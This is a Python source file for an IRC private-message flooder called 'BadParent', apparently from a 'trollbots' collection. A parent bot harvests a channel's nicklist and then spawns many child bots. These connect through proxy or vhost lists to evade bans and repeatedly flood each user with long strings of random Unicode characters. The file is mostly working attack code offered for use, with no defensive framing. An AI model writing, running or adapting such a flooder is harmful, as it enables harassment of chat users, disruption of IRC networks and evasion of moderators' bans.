#!/usr/bin/env python
# BadParent IRC Bot - Developed by acidvegas in Python (https://acid.vegas/trollbots)
# badparent.py

import argparse
import concurrent.futures
import os
import random
import ssl
import socket
import string
import sys
import threading
import time

sys.dont_write_bytecode = True

import config

def alert(msg):
	print(f'{get_time()} | [+] - {msg}')

def debug(msg):
	print(f'{get_time()} | [~] - {msg}')

def error(msg, reason=None):
	print(f'{get_time()} | [!] - {msg} ({reason})') if reason else print(f'{get_time()} | [!] - {msg}')

def error_exit(msg):
	raise SystemExit(f'{get_time()} | [!] - {msg}')

def get_time():
	return time.strftime('%I:%M:%S')

def random_str(size):
	return ''.join(random.choice(string.ascii_letters) for _ in range(size))

def unicode():
	msg = ''
	for i in range(random.randint(400,450)):
		msg += chr(random.randint(0x1000, 0x3000))
	return msg

class parent(object):
	def __init__(self):
		self.nicklist = list()
		self.sock     = None

	def connect(self):
		try:
			self.create_socket()
			self.sock.connect((config.connection.server, config.connection.port))
			self.register()
		except socket.error as ex:
			error('Failed to connect to IRC server.', ex)
			self.event_disconnect()
		else:
			self.listen()

	def create_socket(self):
		family = socket.AF_INET6 if config.connection.ipv6 else socket.AF_INET
		if config.connection.proxy:
			proxy_server, proxy_port = config.connection.proxy.split(':')
			self.sock = socks.socksocket(family, socket.SOCK_STREAM)
			self.sock.setblocking(0)
			self.sock.settimeout(config.throttle.timeout)
			self.sock.setproxy(socks.PROXY_TYPE_SOCKS5, proxy_server, int(proxy_port))
		else:
			self.sock = socket.socket(family, socket.SOCK_STREAM)
		if config.connection.vhost:
			self.sock.bind((config.connection.vhost, 0))
		if config.connection.ssl:
			ctx = ssl.SSLContext()
			if config.cert.file:
				ctx.load_cert_chain(config.cert.file, config.cert.key, config.cert.password)
			self.sock = ctx.wrap_socket(self.sock)

	def event_connect(self):
		if config.login.nickserv:
			self.identify(config.ident.nickname, config.login.nickserv)
		self.join_channel(config.connection.channel, config.connection.key)

	def event_disconnect(self):
		error('The parent bot has disconected!')
		self.sock.close()

	def event_end_of_names(self, chan):
	   if self.nicklist:
		   alert(f'Found {len(self.nicklist)} nicks in channel.')
		   threading.Thread(target=load_children).start()
	   else:
		   error('Failed to parse nicklist from channel.')

	def event_join(self, nick, chan):
		if chan == config.connection.channel:
			if nick not in self.nicklist:
				self.nicklist.append(nick)

	def event_kick(self, nick, chan, kicked):
		if chan == config.connection.channel:
			if kicked == config.ident.nickname:
				time.sleep(3)
				self.join(self.chan, self.key)

	def event_names(self, chan, names):
		if chan == config.connection.channel:
			for name in names:
				if name[:1] in '~!@%&+:':
					name = name[1:]
				if name != config.ident.nickname and name not in self.nicklist:
					self.nicklist.append(name)

	def event_nick(self, nick, new):
		if nick in self.nicklist:
			self.nicklist.remove(nick)
			self.nicklist.append(new)

	def event_nick_in_use(self):
		self.raw('NICK ' + random_str(random.randint(4,7)))

	def event_quit(self, nick):
		if nick in self.nicklist:
			self.nicklist.remove(nick)

	def handle_events(self, data):
		args = data.split()
		if data.startswith('ERROR :Closing Link:'):
			raise Exception('Connection has closed.')
		elif args[0] == 'PING':
			self.raw('PONG ' + args[1][1:])
		elif args[1] == '001':
			self.event_connect()
		elif args[1] == '433':
			self.event_nick_in_use()
		elif args[1] == '353':
			chan = args[4]
			if ' :' in data:
				names = data.split(' :')[1].split()
			elif ' *' in data:
				names = data.split(' *')[1].split()
			elif ' =' in data:
				names = data.split(' =')[1].split()
			else:
				names = data.split(chan)[1].split()
			self.event_names(chan, names)
		elif args[1] == '366':
			chan = args[3]
			self.event_end_of_names(chan)
		elif args[1] == 'JOIN':
			nick = args[0].split('!')[0][1:]
			chan = args[2][1:]
			self.event_join(nick, chan)
		elif args[1] == 'KICK':
			chan   = args[2]
			kicked = args[3]
			self.event_kick(nick, chan, kicked)
		elif args[1] == 'NICK':
			nick = args[0].split('!')[0][1:]
			new  = args[2][1:]
			self.event_nick(nick, new)
		elif args[1] == 'QUIT' :
			nick = args[0].split('!')[0][1:]
			self.event_quit(nick)

	def join_channel(self, chan, key=None):
		self.raw(f'JOIN {chan} {key}') if key else self.raw('JOIN ' + chan)

	def listen(self):
		while True:
			try:
				data = self.sock.recv(1024).decode('utf-8')
				for line in (line for line in data.split('\r\n') if len(line.split()) >= 2):
					self.handle_events(line)
			except (UnicodeDecodeError,UnicodeEncodeError):
				pass
			except Exception as ex:
				error('Unexpected error occured.', ex)
				break
		self.event_disconnect()

	def raw(self, msg):
		self.sock.send(bytes(msg + '\r\n', 'utf-8'))

	def register(self):
		if config.login.network:
			self.raw('PASS ' + config.login.network)
		self.raw(f'USER {config.ident.username} 0 * :{config.ident.realname}')
		self.raw('NICK ' + config.ident.nickname)



class child:
	def __init__(self, data_line):
		self.data_line = data_line
		self.sock      = None

	def attack(self):
		while True:
			try:
				if not Parent.nicklist:
					error('Nicklist has become empty!')
					break
				for name in Parent.nicklist:
					self.sendmsg(name, unicode())
					time.sleep(config.throttle.pm)
			except:
				break

	def connect(self):
		try:
			self.create_socket()
			self.sock.connect((config.connection.server, config.connection.port))
			self.register()
		except socket.error:
			self.sock.close()
		else:
			self.listen()

	def create_socket(self):
		family = socket.AF_INET6 if config.connection.ipv6 else socket.AF_INET
		if pargs.proxy:
			proxy_server, proxy_port = self.data_line.split(':')
			self.sock = socks.socksocket(family, socket.SOCK_STREAM)
			self.sock.setblocking(0)
			self.sock.settimeout(config.throttle.timeout)
			self.sock.setproxy(socks.PROXY_TYPE_SOCKS5, proxy_server, int(proxy_port))
		elif pargs.vhost:
			self.sock = socket.socket(family, socket.SOCK_STREAM)
			self.sock.bind((self.data_line, 0))
		if config.connection.ssl:
			self.sock = ssl.wrap_socket(self.sock)

	def event_connect(self):
		alert(f'Successful connection. ({self.data_line})')
		threading.Thread(target=self.attack).start()

	def event_bad_nick(self, nick):
		if nick in Parent.nicklist:
			Parent.nicklist.remove(nick)

	def event_nick_in_use(self):
			self.raw('NICK ' + random_str(random.randint(4,7)))

	def handle_events(self, data):
		args = data.split()
		if data.startswith('ERROR :Closing Link:'):
			raise Exception('Connection has closed.')
		elif args[0] == 'PING':
			self.raw('PONG ' + args[1][1:])
		elif args[1] == '001':
			self.event_connect()
		elif args[1] == '401':
			nick = args[3]
			self.event_bad_nick()
		elif args[1] == '433':
			self.event_nick_in_use()
		elif args[1] == '486':
			nick = args[-1:]
			self.event_bad_nick(nick)
		elif args[1] == '716':
			nick = args[3]
			self.event_bad_nick(nick)
		elif args[1] == 'NOTICE':
			if 'User does not accept private messages' in data:
				nick = args[5][1:-1]
				self.event_bad_nick(nick)

	def listen(self):
		while True:
			try:
				data = self.sock.recv(1024).decode('utf-8')
				for line in (line for line in data.split('\r\n') if len(line.split()) >= 2):
					self.handle_events(line)
			except (UnicodeDecodeError,UnicodeEncodeError):
				pass
			except:
				break
		self.sock.close()

	def raw(self, msg):
		self.sock.send(bytes(msg + '\r\n', 'utf-8'))

	def register(self):
		if config.login.network:
			self.raw('PASS ' + config.login.network)
		self.raw('USER {0} 0 * :{1}'.format(random_str(random.randint(4,7)), random_str(random.randint(4,7))))
		self.raw('NICK ' + random_str(random.randint(4,7)))

	def sendmsg(self, target, msg):
		self.raw(f'PRIVMSG {target} :{msg}')



def load_children():
	debug('Loading children bots...')
	for i in range(config.throttle.concurrency):
		debug('Concurrency round starting....')
		with concurrent.futures.ThreadPoolExecutor(max_workers=config.throttle.threads) as executor:
			checks = {executor.submit(child(item).connect): item for item in data_lines}
			for future in concurrent.futures.as_completed(checks):
				checks[future]
	debug('Flooding is complete. (Threads still may be running!)')

# Main
print('#'*56)
print('#{0}#'.format(''.center(54)))
print('#{0}#'.format('BadParent IRC PM Flooder'.center(54)))
print('#{0}#'.format('Developed by acidvegas in Python'.center(54)))
print('#{0}#'.format('https://acid.vegas/badparent'.center(54)))
print('#{0}#'.format(''.center(54)))
print('#'*56)
parser = argparse.ArgumentParser(usage='%(prog)s <input> [options]')
parser.add_argument('input',         help='file to scan')
parser.add_argument('-p', '--proxy', help='proxy list', action='store_true')
parser.add_argument('-v', '--vhost', help='vhost list', action='store_true')
pargs = parser.parse_args()
if (pargs.proxy and pargs.vhost) or (not pargs.proxy and not pargs.vhost):
	error_exit('Invalid arguments.')
if pargs.proxy:
	try:
		import socks
	except ImportError:
		error_exit('Missing PySocks module! (https://pypi.python.org/pypi/PySocks)')
if not os.path.isfile(pargs.input):
	error_exit('No such input file.')
data_lines = [line.strip() for line in open(pargs.input).readlines() if line]
debug(f'Loaded {len(data_lines)} lines from file.')
random.shuffle(data_lines)
debug('Starting parent bot connection...')
Parent = parent()
Parent.connect()
